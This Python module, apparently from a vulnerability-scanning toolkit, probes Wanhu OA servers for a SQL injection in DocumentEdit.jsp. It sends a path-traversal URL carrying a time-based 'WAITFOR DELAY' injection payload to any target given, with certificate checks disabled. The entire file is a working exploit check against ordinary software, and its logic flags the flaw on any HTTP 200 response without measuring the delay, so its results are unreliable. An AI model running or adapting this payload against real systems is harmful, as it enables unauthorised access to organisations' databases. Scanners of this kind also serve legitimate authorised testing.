import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 万户OA_document_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url = urldata + "defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            print(Vcolors.RED + "[+] 存在万户OA DocumentEdit.jsp SQL注入漏洞{}".format(target_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在万户OA DocumentEdit.jsp SQL注入漏洞" +Vcolors.ENDC)
    except:
        logging.error("万户OA_document_sql脚本出现异常")


